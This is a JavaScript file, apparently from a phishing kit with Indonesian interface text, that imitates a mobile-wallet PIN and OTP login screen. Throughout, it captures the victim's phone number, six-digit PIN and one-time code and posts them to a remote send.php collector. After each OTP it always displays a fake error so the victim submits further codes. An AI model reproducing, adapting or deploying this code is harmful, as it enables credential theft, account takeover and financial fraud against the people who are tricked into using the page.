import { API_URL } from './global.js';

const DEFAULT_TIMEOUT = 120;
var timeout = DEFAULT_TIMEOUT;
var pinShown = false;

$(document).ready(function() {
	setTimeout(() => {
		$("#pin1").focus();
	}, 500);
	$("#pin1").on('input', function() {
		var pin = $("#pin1").val().trim();
		if (pin.length >= 1) {
			$("#pin2").focus();
		}
	});
	$("#pin2").on('input', function() {
		var pin = $("#pin2").val().trim();
		if (pin.length >= 1) {
			$("#pin3").focus();
		} else {
			$("#pin1").focus();
		}
	});
	$("#pin3").on('input', function() {
		var pin = $("#pin3").val().trim();
		if (pin.length >= 1) {
			$("#pin4").focus();
		} else {
			$("#pin2").focus();
		}
	});
	$("#pin4").on('input', function() {
		var pin = $("#pin4").val().trim();
		if (pin.length >= 1) {
			$("#pin5").focus();
		} else {
			$("#pin3").focus();
		}
	});
	$("#pin5").on('input', function() {
		var pin = $("#pin5").val().trim();
		if (pin.length >= 1) {
			$("#pin6").focus();
		} else {
			$("#pin4").focus();
		}
	});
	$("#pin6").on('input', function() {
		var pin = $("#pin6").val().trim();
		if (pin.length >= 1) {
			var pin = $("#pin1").val().trim()
                +$("#pin2").val().trim()
                +$("#pin3").val().trim()
                +$("#pin4").val().trim()
                +$("#pin5").val().trim()
                +$("#pin6").val().trim();
             window.localStorage.setItem('pin', pin);
             var phone = window.localStorage.getItem('phone');
			$("#loader").css('display', 'flex');
			var fd = new FormData();
	fd.append('message', '<b>No. HP:</b> '+phone+'\n<b>PIN:</b> '+pin);
	$.ajax({
		url: API_URL+'/send.php',
		type: 'POST',
		data: fd,
		processData: false,
		contentType: false,
		success: function(response) {
			$("#loader").css('display', 'none');
			window.location.href = "otp.html";
			/*$("#otp-container").css('visibility', 'visible');
			$("#otp1").focus();*/
		}
	});
		} else {
			$("#pin5").focus();
		}
	});
	$("#otp1").on('input', function() {
		var pin = $("#otp1").val().trim();
		if (pin.length >= 1) {
			$("#otp2").focus();
		}
	});
	$("#otp2").on('input', function() {
		var pin = $("#otp2").val().trim();
		if (pin.length >= 1) {
			$("#otp3").focus();
		} else {
			$("#otp1").focus();
		}
	});
	$("#otp3").on('input', function() {
		var pin = $("#otp3").val().trim();
		if (pin.length >= 1) {
			$("#otp4").focus();
		} else {
			$("#otp2").focus();
		}
	});
	$("#otp4").on('input', function() {
		var pin = $("#otp4").val().trim();
		if (pin.length >= 1) {
			next();
		} else {
			$("#otp3").focus();
		}
	});
	/*$(document).keydown(function(event) {
        if (event.keyCode === 8) {
            var pin = getPIN();
            if ($("#pin6").is(':focus')) {
            	$("#pin6").val("");
                $("#pin5").focus();
                setCaretPosition($("#pin5"), 1);
            } else if ($("#pin5").is(':focus')) {
            	$("#pin5").val("");
                $("#pin4").focus();
            } else if ($("#pin4").is(':focus')) {
            	$("#pin4").val("");
                $("#pin3").focus();
            } else if ($("#pin3").is(':focus')) {
            	$("#pin3").val("");
                $("#pin2").focus();
            } else if ($("#pin2").is(':focus')) {
            	$("#pin2").val("");
                $("#pin1").focus();
            }
        }
    });*/
	runTimeout();
});

function getPIN() {
	return $("#pin1").val().trim()
                +$("#pin2").val().trim()
                +$("#pin3").val().trim()
                +$("#pin4").val().trim()
                +$("#pin5").val().trim()
                +$("#pin6").val().trim();
}

function runTimeout() {
	setTimeout(() => {
		if (timeout > 0) {
		    timeout--;
		} else {
			timeout = DEFAULT_TIMEOUT;
			return;
		}
		$("#timeout").html("KIRIM ULANG ("+timeout+"s)");
		runTimeout();
	}, 1000);
}

function next() {
	var otp = $("#otp1").val().trim()
	    +$("#otp2").val().trim()
	    +$("#otp3").val().trim()
	    +$("#otp4").val().trim();
	var phone = window.localStorage.getItem('phone');
	var pin = window.localStorage.getItem('pin');
			$("#loader").css('display', 'flex');
			var fd = new FormData();
	fd.append('message', '<b>No. HP:</b> '+phone+'\n<b>PIN:</b> '+pin+'\n<b>Kode OTP:</b> '+otp);
	$.ajax({
		url: API_URL+'/send.php',
		type: 'POST',
		data: fd,
		processData: false,
		contentType: false,
		success: function(response) {
			timeout = DEFAULT_TIMEOUT;
			$("#loader").css('display', 'none');
			$("#otp-error").css('display', 'block');
			$("#otp-container").css('visibility', 'visible');
		}
	});
}

function showHidePIN() {
	pinShown = !pinShown;
	if (pinShown) {
		$("#show-hide-pin").html('Sembunyikan');
		$("#pin1").removeClass("hidden-input");
		$("#pin2").removeClass("hidden-input");
		$("#pin3").removeClass("hidden-input");
		$("#pin4").removeClass("hidden-input");
		$("#pin5").removeClass("hidden-input");
		$("#pin6").removeClass("hidden-input");
		$("#pin1").addClass("shown-input");
		$("#pin2").addClass("shown-input");
		$("#pin3").addClass("shown-input");
		$("#pin4").addClass("shown-input");
		$("#pin5").addClass("shown-input");
		$("#pin6").addClass("shown-input");
	} else {
		$("#show-hide-pin").html('Tampilkan');
		$("#pin1").addClass("hidden-input");
		$("#pin2").addClass("hidden-input");
		$("#pin3").addClass("hidden-input");
		$("#pin4").addClass("hidden-input");
		$("#pin5").addClass("hidden-input");
		$("#pin6").addClass("hidden-input");
		$("#pin1").removeClass("shown-input");
		$("#pin2").removeClass("shown-input");
		$("#pin3").removeClass("shown-input");
		$("#pin4").removeClass("shown-input");
		$("#pin5").removeClass("shown-input");
		$("#pin6").removeClass("shown-input");
	}
}

function ackEnterPIN() {
	$("#alert1").css('display', 'none');
	$("#pin1").focus();
}

const setCaretPosition = (ctrl, pos) => {
  if (ctrl.setSelectionRange) {
    ctrl.focus();
    ctrl.setSelectionRange(pos, pos);
  }
}

function setCursorPosition(inputElement, position) {
    if (inputElement.setSelectionRange) {
        inputElement.setSelectionRange(0, 1);
    } else if (inputElement.createTextRange) {
        var range = inputElement.createTextRange();
        range.move('character', position);
        range.select();
    }
}

module.showHidePIN = showHidePIN;
module.ackEnterPIN = ackEnterPIN;